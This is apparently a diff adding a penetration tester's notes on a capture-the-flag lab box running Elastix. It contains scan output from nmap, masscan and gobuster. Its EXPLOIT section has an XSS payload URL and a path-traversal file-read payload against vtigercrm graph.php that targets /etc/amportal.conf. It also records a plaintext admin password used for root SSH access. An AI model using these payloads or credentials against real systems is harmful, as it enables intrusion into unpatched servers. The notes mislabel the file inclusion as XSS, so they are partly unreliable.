@@ -1,0 +1,87 @@
+---NMAP---
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+111/tcp  open  rpcbind    2 (RPC #100000)
+3306/tcp open  mysql      MySQL (unauthorized)
+4445/tcp open  upnotifyp?
+
+*nmap -sV -sC --script=nfs-showmount IP
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)
+25/tcp   open  smtp       Postfix smtpd
+80/tcp   open  http       Apache httpd 2.2.3
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+110/tcp  open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+111/tcp  open  rpcbind    2 (RPC #100000)
+143/tcp  open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+443/tcp  open  ssl/https?
+993/tcp  open  ssl/imap   Cyrus imapd
+995/tcp  open  pop3       Cyrus pop3d
+3306/tcp open  mysql      MySQL (unauthorized)
+4445/tcp open  upnotifyp?
+Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
+
+---MASSCAN---
+Discovered open port 993/tcp on 10.10.10.7
+Discovered open port 80/tcp on 10.10.10.7
+Discovered open port 25/tcp on 10.10.10.7
+Discovered open port 111/tcp on 10.10.10.7
+Discovered open port 22/tcp on 10.10.10.7
+Discovered open port 5038/tcp on 10.10.10.7
+Discovered open port 4190/tcp on 10.10.10.7
+Discovered open port 4445/tcp on 10.10.10.7
+
+---gobuster---
+/ (common.txt):
+  /.hta (Status: 403)
+  /.hta.php (Status: 403)
+  /.hta.txt (Status: 403)
+  /.htaccess (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htaccess.txt (Status: 403)
+  /.htpasswd (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /.htpasswd.txt (Status: 403)
+  /admin (Status: 301)
+  /cgi-bin/ (Status: 403)
+  /config.php (Status: 200)
+  /configs (Status: 301)
+  /favicon.ico (Status: 200)
+  /help (Status: 301)
+  /images (Status: 301)
+  /index.php (Status: 200)
+  /index.php (Status: 200)
+  /lang (Status: 301)
+  /libs (Status: 301)
+  /mail (Status: 301)
+  /modules (Status: 301)
+  /panel (Status: 301)
+  /register.php (Status: 200)
+  /robots.txt (Status: 200)
+  /robots.txt (Status: 200)
+  /static (Status: 301)
+  /themes (Status: 301)
+  /var (Status: 301)
+
+/ (big.txt):
+
+
+
+---EXPLOIT---
+found that elastix is vulneralbe to xss
+*https://10.10.10.7/libs/jpgraph/Examples/bar_csimex3.php/"><IMg srC= x OnerRoR = JSCOMMAND>
+nothing achieved
+
+another xss on https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module
+found a user/pass admin/jEhdIekWmdjE
+login into 10.10.10.7
+trying ssh root@10.10.10.7
+kudos!
+*cat /home/fanis/user.txt
+*cat /root/root.txt
+
